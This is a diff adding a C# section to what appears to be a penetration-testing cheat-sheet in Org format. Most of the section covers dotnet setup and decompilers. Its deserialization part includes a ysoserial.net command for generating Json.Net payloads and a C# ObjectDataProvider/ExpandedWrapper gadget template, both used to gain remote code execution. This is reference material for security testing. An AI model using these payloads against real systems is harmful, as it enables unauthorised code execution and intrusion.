@@ -2327,6 +2327,168 @@
 **** Object Injection
      - [[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md][See]] - PHP objects can be serialized and included in vulnerable applications (see the [[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phar][phar wrapper]])
      - Leverage destructors, function calls, etc using user-controlled code to perform RCE
+*** C# / C-sharp
+**** Linux
+***** dotnet
+****** Install Standalone
+       - From [[https://docs.microsoft.com/en-us/dotnet/core/install/linux-scripted-manual#scripted-install][docs.microsoft]] (see deps)+[[https://docs.microsoft.com/en-us/dotnet/core/tools/telemetry#how-to-opt-out][Telemetry]]
+         #+begin_src sh
+           curl -L -O https://dot.net/v1/dotnet-install.sh
+
+           # Opt out of the Telemetry
+           export DOTNET_CLI_TELEMETRY_OPTOUT=1
+           # Only required before installing
+
+           # Non-root - Latest SDK install
+           bash dotnet-install.sh -c Current
+           # -c <LTS/3.1>      - 6.0 LTS or 3.1
+           # --runtime aspcore - Runtime only
+
+           # The ~/.dotnet folder can be moved to
+           # /usr/share and consider symlinking
+           # the dotnet tool to /usr/bin
+         #+end_src
+****** Build
+       - New console project:
+         #+begin_src sh
+           mkdir test
+
+           cd test
+
+           dotnet new console
+
+           # Edit Program.cs
+           vi Program.cs
+
+           # Add dependencies
+           dotnet add package <name>
+           dotnet add reference <path>
+
+           # Test it
+           dotnet run
+
+           # Build it (Debug build)
+           dotnet build
+           # -c Release     - Relase build
+           # -f <framework> - Target FW
+           # -r <runtime>   - Target Runtime
+           # --arch <arch>  - Target Arch
+           # --os <os>      - Target OS
+           #
+           # Flags required to "self-contain"
+           # --sc           - Self-Contained
+           # --use-current-runtime | -r <runtime>
+           # <arch>-<os> dir is self-contained
+         #+end_src
+***** ILSpy
+     - [[https://github.com/icsharpcode/ILSpy][Win]] - [[https://github.com/icsharpcode/AvaloniaILSpy][Linux]] - Cross-platform C# Decompiler
+     - Better decompilation than ~dnSpy~
+     - Linux ~AvaloniaILSpy~ HiDPI - [[https://github.com/AvaloniaUI/Avalonia/wiki/Configuring-X11-per-monitor-DPI][ref]]:
+       #+begin_src sh
+         xrandr --listactivemonitors
+
+         AVALONIA_SCREEN_SCALE_FACTORS='eDP-1=3' artifacts/linux-x64/ILSpy
+       #+end_src
+     - ~dotnet~ command line tool:
+       #+begin_src sh
+         # Install
+         dotnet tool install -g ilspycmd
+
+         # Add tool to PATH
+         export PATH="$PATH:$HOME/.dotnet/tools"
+
+         ilspycmd <file>
+         # -o <dir>        - Decompile to folder
+         # -p              - Decompile as project
+         # -d              - Dump file bundle
+         # -lv <ver>       - C# lang version
+         # -r <path>       - Path to dependencies
+         # --no-dead-code
+         # --no-dead-stores
+       #+end_src
+**** Docker
+     - Select the appropriate version: [[https://hub.docker.com/_/microsoft-dotnet-sdk][docker hub]]
+       #+begin_src sh
+         docker run -it --rm --entrypoint /bin/bash -v "/tmp/test:/mnt/shared:rw" mcr.microsoft.com/dotnet/sdk:<ver>
+
+         # Check the SDKs and Runtimes
+         dotnet --list-sdks
+
+         dotnet --list-runtimes
+         # Consider using the Linux Standalone
+         # above for different SDKs/runtimes
+
+         # Remove image
+         docker rmi mcr.microsoft.com/dotnet/sdk:<ver>
+       #+end_src
+**** Windows
+***** Decompilation
+****** dnSpy
+      - [[https://github.com/dnSpyEx/dnSpy][Site]] (fork) - GUI C# Decompiler/Editor
+      - Get the [[https://github.com/dnSpyEx/dnSpy/releases][binaries]]
+      - [[https://stackoverflow.com/a/57311539][Try the 32bit]] if errors when recompiling
+      - Robust for obfuscated assemblies - [[https://www.reddit.com/r/ReverseEngineering/comments/kgvl1q/comment/ggnerb0/?utm_source=reddit&utm_medium=web2x&context=3][see]]
+**** Debugging
+     - Edit C# Assembly attributes:
+       #+begin_src csharp
+         // From
+         [assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
+
+         // To
+         [assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
+       #+end_src
+**** Deserialization
+***** ysoserial.net
+     - [[https://github.com/pwntester/ysoserial.net][Site]] - Deserialization payload generator
+     - Visual Studio 2022 Fix - [[https://github.com/pwntester/ysoserial.net/issues/121#issuecomment-1184663158][ref]]
+       #+begin_src bat
+         dotnet nuget remove source nuget.org
+
+         dotnet nuget add source https://api.nuget.org/v3/index.json -n nuget.org
+       #+end_src
+     - Example:
+       #+begin_src bat
+         type "<file-long-cmd>" | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
+       #+end_src
+***** ObjectDataProvider
+     - [[https://docs.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider][docs.microsoft]] - ~using System.Windows.Data;~
+     - From [[https://github.com/dotnet/wpf][WPF]] - Windows only
+     - XML deserialization via [[https://docs.microsoft.com/en-us/dotnet/api/system.data.services.internal.expandedwrapper-2][ExpandedWrapper]]:
+       #+begin_src csharp
+         using System;
+         using System.IO;
+         using System.Xml.Serialization;
+
+         using System.Windows.Data;
+         using System.Data.Services.Internal;
+
+         using <lib-to-call-when-deserializing>;
+
+         namespace ODPXmlSerializer
+         {
+             class Program
+             {
+                 static void Main(string[] args)
+                 {
+                     var myExpWrap = new ExpandedWrapper<<class-from-lib>, ObjectDataProvider>();
+
+                     myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
+
+                     myExpWrap.ProjectedProperty0.ObjectInstance = new <class-from-lib>();
+                     myExpWrap.ProjectedProperty0.MethodName = "<method-from-lib>";
+                     myExpWrap.ProjectedProperty0.MethodParameters.Add("<method-param1>");
+                     myExpWrap.ProjectedProperty0.MethodParameters.Add("<method-param2>");
+
+                     var xmlSerializer = new XmlSerializer(myExpWrap.GetType());
+                     var stringWriter = new StringWriter();
+
+                     xmlSerializer.Serialize(stringWriter, myExpWrap);
+
+                     Console.WriteLine(stringWriter.ToString());
+                 }
+             }
+         }
+       #+end_src
 *** XML
 **** Injection
 ***** Notes
